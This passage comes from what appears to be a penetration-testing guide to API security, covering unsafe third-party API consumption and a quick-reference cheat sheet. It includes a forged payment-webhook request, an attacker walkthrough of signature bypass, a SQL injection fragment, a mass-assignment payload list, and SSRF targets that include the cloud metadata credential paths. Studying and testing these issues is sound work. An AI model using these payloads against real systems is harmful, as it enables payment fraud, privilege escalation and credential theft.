Modern applications are composed of many interconnected services — payment providers, identity providers, notification services, data enrichment APIs, partner integrations. If the consuming application treats data from these external sources as implicitly trusted without validating integrity, authenticity, or content, an attacker who can influence the external API response can inject malicious data into the consuming application's logic.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| Payment webhooks | Provider POSTs `{"status": "paid"}` → app credits | Signature not verified → fake payment |
| OAuth/SSO responses | Trust claims from identity provider blindly | Claim injection if IdP compromised |
| Third-party data enrichment | User data from external API used in SQL query | Injection via external data |
| Webhook delivery to microservices | Internal service trusts forwarded data | Trust boundary collapse |
| External API responses deserialized | Binary serialized objects from partner API | Deserialization RCE |
| External content rendered | HTML from external API rendered in page | Stored XSS via external source |

### Detection & Testing

**Webhook signature bypass:**
```http
# Forge payment notification without valid signature
POST /api/webhooks/payment HTTP/1.1
Content-Type: application/json
X-Webhook-Signature: (missing or arbitrary)

{
  "event": "payment.success",
  "amount": 99.99,
  "order_id": "ORDER-1337",
  "status": "paid"
}
```

**Positive indicator:** Order marked as paid despite invalid/missing signature.

**Manipulate data from integrated external API:**
```
1. Application uses third-party user lookup: GET /api/users?id=X → external API
2. External API response contains `{"email": "user@example.com", "role": "user"}`
3. If attacker can influence external API response (MITM, compromised external service):
   {"email": "user@example.com", "role": "admin", "sql_field": "' UNION SELECT..."}
4. Application trusts and processes the data → SQLi or privilege escalation via external API
```

> **Attacker note:** Payment webhook validation failures are disproportionately common and disproportionately impactful. Any `/webhook`, `/callback`, `/notify`, or `/ipn` endpoint is a prime target. First, send a legitimate-looking payload without the signature header and see if the order is processed. Then send with a blank signature, then with a known-bad signature. If any of these succeed, it's a critical finding — the entire payment flow is bypassable.

---

## 13. Quick Reference Cheat Sheet

### API Top 10 — One-Line Summary

| ID | Name | Core Flaw | Worst Case |
|----|------|-----------|-----------|
| API1 | BOLA | Object access without ownership check | Read/modify any user's data |
| API2 | Broken Auth | Weak/missing token validation | Account takeover, privilege escalation |
| API3 | Broken Object Property Auth | Expose/accept wrong properties | Mass assignment to admin, credential leak |
| API4 | Unrestricted Resource Consumption | No rate limits or resource caps | DoS, OTP brute force, financial abuse |
| API5 | Broken Function Level Auth | Functions reachable without permission | Admin access, data deletion |
| API6 | Sensitive Business Flow Abuse | Workflow rules not enforced | Payment bypass, coupon abuse, race conditions |
| API7 | SSRF | URL input reaches internal systems | Cloud credential theft, internal RCE |
| API8 | Security Misconfiguration | Insecure defaults and exposed internals | Auth bypass, data exposure, full compromise |
| API9 | Improper Inventory | Old/shadow APIs unmanaged | Auth bypass via legacy endpoint |
| API10 | Unsafe API Consumption | External data trusted without validation | Payment forgery, injection via third-party |

### What to Test on Every API Endpoint

```
1. BOLA:      Change the object ID to another user's ID → same or different HTTP method
2. Auth:      Remove token, use expired token, use another user's token
3. Properties: Add role/isAdmin/admin fields to request body → check response
4. Rate:      Send 100 requests rapidly → check for 429 or blocking
5. Function:  Try PUT/DELETE on GET-only endpoints, try admin paths with user token
6. Business:  Skip workflow steps, send concurrent requests on one-use actions
7. SSRF:      Any URL parameter → try localhost/169.254.169.254/your-oast-server
8. Config:    Check CORS headers, error verbosity, /swagger, /actuator
9. Inventory: Try /v1/ /v2/ /beta/ /internal/ versions of every endpoint
10. Trust:    POST to webhook endpoints without valid signature
```

### BOLA ID Types & Test Approach

| ID Type | Test | Notes |
|---------|------|-------|
| Sequential int | `id=1001` → try `1000`, `1002`, `1` | Most enumerable |
| UUID | Collect from email/links/other responses | Not unguessable if leaked |
| Username | `/api/users/alice` → try `/api/users/admin` | Try known usernames |
| Hash | Identify hash type → hash known values | MD5 of email is common |
| Business ID | `INV-2024-001` → `INV-2024-002` | Sequential business formats |

### Mass Assignment — Hidden Fields to Try

```json
{
  "role": "admin",
  "isAdmin": true,
  "admin": true,
  "is_staff": true,
  "superuser": true,
  "emailVerified": true,
  "email_confirmed": true,
  "accountStatus": "active",
  "creditBalance": 999999,
  "subscriptionPlan": "enterprise",
  "twoFactorEnabled": false,
  "locked": false,
  "group": "administrators"
}
```

### SSRF Internal Target Quick Reference

```
Loopback:           127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
AWS metadata:       169.254.169.254/latest/meta-data/iam/security-credentials/
GCP metadata:       metadata.google.internal/computeMetadata/v1/
Azure metadata:     169.254.169.254/metadata/instance
Docker host:        172.17.0.1 (default Docker bridge)
Kubernetes API:     10.96.0.1:443 (default cluster IP)
Internal common:    10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
```

### API Endpoint Discovery Sources

```
1. JavaScript bundles     → grep for /api/, fetch(, axios.
2. Mobile app binary      → decompile, search https://api.
3. Swagger/OpenAPI        → /swagger.json, /openapi.yaml, /api-docs
4. GraphQL introspection  → POST /graphql {"query": "{__schema{types{name}}}"}
5. Web archive            → old API versions, deprecated endpoints
6. Error messages         → route not found errors often list valid routes
7. Postman collections    → published or leaked collections
8. GitHub/source repos    → hardcoded API routes in code
9. SSL certificate SANs   → api.target.com, internal-api.target.com
10. DNS brute force        → api, api2, api-internal, api-v1, api-staging
```

### Security Misconfiguration — Critical Endpoints to Always Check

```
/swagger-ui.html         → Swagger UI
/swagger.json            → API schema (all endpoints + params)
/openapi.json            → OpenAPI schema
/api-docs                → Documentation
/graphql                 → GraphQL endpoint
/graphiql                → GraphQL IDE
/actuator                → Spring Boot: list of actuator endpoints
/actuator/env            → Spring Boot: ALL environment variables (credentials!)
/actuator/mappings       → Spring Boot: all application routes
/actuator/health         → Spring Boot: service details
/debug                   → Framework debug panels
/.well-known/openid-configuration → Auth endpoints
```